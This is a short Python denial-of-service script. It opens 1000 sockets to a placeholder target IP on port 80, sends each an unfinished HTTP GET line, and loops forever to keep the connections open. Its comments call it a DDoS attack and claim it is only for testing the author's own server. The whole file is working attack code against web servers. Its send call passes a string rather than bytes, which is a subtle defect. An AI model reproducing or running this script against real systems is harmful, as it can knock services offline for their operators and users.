import socket
import threading
import time

# Will never be used unless testing my own server.
# Set the target IP address and port:
TARGET_IP = "xxx.xxx.xxx.xxx"
TARGET_PORT = 80

# Set the number of connections to create:
NUM_CONNECTIONS = 1000
connections = []

# Create the specified number of connections and add them to the list.
for i in range(NUM_CONNECTIONS):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    connections.append(s)

# Define a function to send the request using a given socket.
def send_request(sock):
    sock.send("GET / HTTP/1.1\r\n")

# Create a thread for each socket and start it.
threads = []
for s in connections:
    t = threading.Thread(target=send_request, args=(s,))
    t.start()
    threads.append(t)
# Keep the threads alive to continue the DDoS attack.
while True:
    time.sleep(0.5)
